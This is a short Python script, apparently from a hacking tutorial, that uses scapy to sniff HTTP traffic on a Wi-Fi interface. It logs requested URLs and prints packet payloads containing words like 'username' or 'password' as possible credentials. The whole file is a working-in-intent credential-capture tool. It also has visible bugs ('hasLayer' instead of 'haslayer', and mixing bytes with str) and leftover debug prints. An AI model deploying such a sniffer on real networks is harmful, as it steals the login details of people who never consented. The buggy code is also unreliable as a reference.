#!/usr/bin/env python
from scapy.layers.inet import IP, TCP

import scapy.all as scapy
from scapy.layers import http



def sniff(interface):
    print("mahes")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if IP in packet and TCP in packet:
        print("IP/TCP Packet")
        if packet.hasLayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
    else:
        print("Non IP/TCP Packet")



def process_sniffed_packet(packet):
    print("in process method")
    if packet.hasLayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("Wi-Fi")
